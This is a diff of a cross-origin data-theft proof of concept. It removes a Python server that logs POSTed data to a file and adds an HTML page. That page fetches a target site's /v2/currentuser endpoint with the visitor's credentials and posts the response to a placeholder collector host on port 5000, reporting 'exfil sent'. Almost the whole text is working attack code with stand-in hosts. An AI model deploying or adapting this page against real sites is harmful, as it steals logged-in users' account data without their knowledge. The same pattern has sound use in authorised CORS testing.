@@ -1,21 +1,4 @@
-
-# python3 collector.py
-from http.server import BaseHTTPRequestHandler, HTTPServer
-from datetime import datetime
-import json
-LOG="collected.log"
-class H(BaseHTTPRequestHandler):
-    def do_POST(self):
-        if self.path!="/collect": self.send_response(404); self.end_headers(); return
-        l=int(self.headers.get('Content-Length',0)); raw=self.rfile.read(l).decode('utf-8','replace')
-        try: body=json.loads(raw)
-        except: body=raw
-        entry={"ts":datetime.utcnow().isoformat()+"Z","ip":self.client_address[0],"headers":dict(self.headers),"body":body}
-        print(json.dumps(entry,indent=2))
-        with open(LOG,"a") as f: f.write(json.dumps(entry)+"\n")
-        self.send_response(204); self.end_headers()
-
-if __name__=="__main__":
-    open(LOG,"a").close()
-    print("Collector running on http://0.0.0.0:5000/collect")
-    HTTPServer(("0.0.0.0",5000),H).serve_forever()
+<!doctype html><button id=R>Run</button><pre id=o></pre><script>
+const T="https://<TARGET_HOST>/v2/currentuser";const C="http://<COLLECTOR_HOST>:5000/collect";
+R.onclick=async()=>{o.textContent='';try{const r=await fetch(T,{credentials:'include'});o.textContent='status:'+r.status;const b=await r.text();o.textContent+='\nlen:'+b.length;await fetch(C,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({from:T,origin:location.origin,status:r.status,body:b})});o.textContent+='\nexfil sent'}catch(e){o.textContent='ERR:'+e}}
+</script>
